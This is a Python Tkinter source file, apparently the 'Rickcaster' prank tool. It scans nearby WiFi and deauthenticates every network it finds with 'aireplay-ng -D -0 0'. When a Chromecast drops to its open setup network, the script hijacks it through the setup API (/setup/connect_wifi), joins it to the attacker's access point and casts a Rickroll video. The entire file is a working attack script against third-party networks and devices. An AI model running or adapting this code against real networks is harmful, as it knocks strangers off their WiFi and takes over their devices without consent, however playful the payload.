#!/usr/bin/python

from Tkinter import *
import tkFont
from string import *
import os.path
import sys
import time
import subprocess 
import socket
import requests
import json

#For the actual video playback
import pychromecast as pc

#XXX Edit these two values
WLAN0_BSSID = "YOUR_MAC_ADDRESS_HERE" #The wifi client
WLAN2_BSSID = "YOUR_MAC_ADDRESS_HERE" #The wifi AP

#XXX The YouTube video to play. Default is Rickroll. IE:
# https://www.youtube.com/watch?v=dQw4w9WgXcQ
YOUTUBE_SUFFIX = "dQw4w9WgXcQ"

def get_name(cell):
    return matching_line(cell,"ESSID:")[1:-1]

def get_quality(cell):
    quality = matching_line(cell,"Quality=").split()[0].split('/')
    return str(int(round(float(quality[0]) / float(quality[1]) * 100))).rjust(3) + " %"

def get_channel(cell):
    return matching_line(cell,"Channel:")

def get_encryption(cell):
    enc=""
    if matching_line(cell,"Encryption key:") == "off":
        enc="Open"
    else:
        for line in cell:
            matching = match(line,"IE:")
            if matching!=None:
                wpa=match(matching,"WPA Version ")
                if wpa!=None:
                    enc="WPA v."+wpa
        if enc=="":
            enc="WEP"
    return enc

def get_address(cell):
    return matching_line(cell,"Address: ")

# Here's a dictionary of rules that will be applied to the description of each
# cell. The key will be the name of the column in the table. The value is a
# function defined above.

rules={"Name":get_name,
       "Quality":get_quality,
       "Channel":get_channel,
       "Encryption":get_encryption,
       "Address":get_address,
       }

# You can choose which columns to display here, and most importantly in what order. Of
# course, they must exist as keys in the dict rules.
columns=["Name","Address","Quality","Channel","Encryption"]

def matching_line(lines, keyword):
    """Returns the first matching line in a list of lines. See match()"""
    for line in lines:
        matching=match(line,keyword)
        if matching!=None:
            return matching
    return None

def match(line,keyword):
    """If the first part of line (modulo blanks) matches keyword,
    returns the end of that line. Otherwise returns None"""
    line=line.lstrip()
    length=len(keyword)
    if line[:length] == keyword:
        return line[length:]
    else:
        return None

def parse_cell(cell):
    """Applies the rules to the bunch of text describing a cell and returns the
    corresponding dictionary"""
    parsed_cell={}
    for key in rules:
        rule=rules[key]
        parsed_cell.update({key:rule(cell)})
    return parsed_cell



class WiFiNetwork:
    def __init__(self, SSID, MAC, ENC):
        self.SSID = SSID
        self.MAC = MAC
        self.ENC = ENC

class callit:
    def __init__(self, function, *args ):
        self.f = function
        self.args = args

    def __call__(self, *ignored):
        apply(self.f, self.args)

class RickcastWindow( Tk ):
    def __init__( self ):
        Tk.__init__(self)
        self.title("Rickcaster")
        self.smallFont = tkFont.Font(family="Helvetica", size=20)
        self.hackFont = tkFont.Font(family="Helvetica", size=40)

        self.frame=Frame(self)
        self.MainMenu()

    def callback(self, color):
        self.frame['background']=color

    def HackAll(self, network_list):
        #Deauth all networks found
        self.Deauth(network_list)

        #wait 5 seconds, then let's see if there's any new networks up
        self.after(5000, self.FindChromecasts, network_list)
        self.ClearWindow()
        wait_label=Label(self.frame, text="Scanning for Chromecasts... please wait...")
        wait_label.pack(side=TOP)

    def Deauth(self, network_list):
        self.ClearWindow()
        #deauth all the networks!
        for network in network_list:
            os.system("aireplay-ng -D -0 0 -a" + network.MAC + " mon0 &")

    def FindChromecasts(self, network_list):
        self.ClearWindow()
        new_network_list = self.ReadNetworkList()
        for network in new_network_list:
            if network.ENC == "Open":
                self.Rickroll(network)
        self.MainMenu()
        
    def ConnectToNetwork(self, network):

        filename = "/etc/NetworkManager/system-connections/Chromecast"

        f = open(filename, "w")

        #make a new connection file 
        connection = ("[connection]"
        "\nid=Chromecast"
        "\nuuid=170968e7-b2c2-4cf6-821b-bc9a8ba6de93"
        "\ntype=802-11-wireless"
        "\n"
        "\n[802-11-wireless]"
        "\nssid=" + network.SSID +
        "\nmode=infrastructure"
        "\nmac-address=" + WLAN0_BSSID +
        "\n"
        "\n[ipv6]"
        "\nmethod=auto"
        "\nip6-privacy=2"
        "\n"
        "\n[ipv4]"
        "\nmethod=auto")

        f.write(connection)
        f.close()

        os.system("nmcli con up id Chromecast iface wlan0")
        

    def Rickroll(self, network):
        #Connect to the victim's network

        #Skip if ssid is blank. This definitely won't be a chromecast, and
        # there's a lot of false positives with blank ssid's
        if(len(network.SSID) == 0):
            return

        #also ignore our own network
        if(network.SSID == "RickmoteController"):
            return

        self.ConnectToNetwork(network)

        #Test to see if this is a Chromecast network or just a regular Open one
        try:
            eureka = requests.get("http://192.168.255.249:8008/setup/eureka_info")
            if eureka.status_code == 200:
                headers = {'content-type': 'application/json'}
                payload = {"bssid": WLAN2_BSSID,"signal_level":-49,"ssid":"RickmoteController","wpa_auth":1,"wpa_cipher":1}
                setup = requests.post("http://192.168.255.249:8008/setup/connect_wifi", data=json.dumps(payload), headers=headers)
                if setup.status_code == 200:
                    #First, set the routing correctly, since it's probably all screwed up
                    time.sleep(5)
                    #Disconnect from client wifi
                    os.system("nmcli dev disconnect iface wlan0")
                    #Set routes to get out to the Internet
                    os.system("dhclient eth0")
                    self.PlayVideo()
                    time.sleep(3)
                    self.PlayVideo()
                else:
                    print "ERROR: Chromecast exists, but rejected our POST to it.... HTTP code: " + str(setup.status_code)
            else:
                print "ERROR: Chromecast exists, but had HTTP error: " + str(eureka.status_code)
        except Exception as e:
            "DEBUG: Not a Chromecast network. Detailed error -> " + str(e)

        #Disconnect from client wifi
        os.system("nmcli dev disconnect iface wlan0")

    def PlayVideo(self):
        cast = pc.PyChromecast()
        print cast.device

        # Make sure an app is running that supports RAMP protocol
        if not cast.app or pc.PROTOCOL_RAMP not in cast.app.service_protocols:
            pc.play_youtube_video(YOUTUBE_SUFFIX, cast.host)
            cast.refresh()

        ramp = cast.get_protocol(pc.PROTOCOL_RAMP)

        # It can take some time to setup websocket connection
        # if we just switched to a new channel
        while not ramp:
            time.sleep(1)
            ramp = cast.get_protocol(pc.PROTOCOL_RAMP)

        # Give ramp some time to init
        time.sleep(1)
        

    def MainMenu(self):
        self.ClearWindow()

        os.system("killall aireplay-ng")

        network_list = self.ReadNetworkList()

        self.photo=PhotoImage(file="rick.gif")
        b = Button(self.frame)
        b.config(image=self.photo,width="284",height="284")
        b['command'] = callit(self.HackAll, network_list)
        b.pack( side=TOP, expand=YES, pady=2 )

    def ReadNetworkList(self):
        #scan for networks
        proc = subprocess.Popen('iwlist wlan0 scan 2>/dev/null', shell=True, stdout=subprocess.PIPE )
        stdout_str = proc.communicate()[0]
        stdout_list=stdout_str.split('\n')
        
        cells=[[]]
        parsed_cells=[]

        for line in stdout_list:
            cell_line = match(line,"Cell ")
            if cell_line != None:
                cells.append([])
                line = cell_line[-27:]
            cells[-1].append(line.rstrip())

        cells=cells[1:]

        for cell in cells:
            parsed_cells.append(parse_cell(cell))

        network_list = []
        for cell in parsed_cells:
            network_list.append( WiFiNetwork(cell['Name'], cell['Address'], cell['Encryption']) )
        return network_list

    def ClearWindow(self):
        self.frame.destroy()
        self.frame=Frame(self)
        self.frame.pack(expand=YES, fill=BOTH )
        self.frame.configure(background='white')

if __name__ == '__main__':
    demo = RickcastWindow()
    #XXX Uncomment this line to make the window fullscreen
    #demo.attributes('-fullscreen', True)
    demo.mainloop()

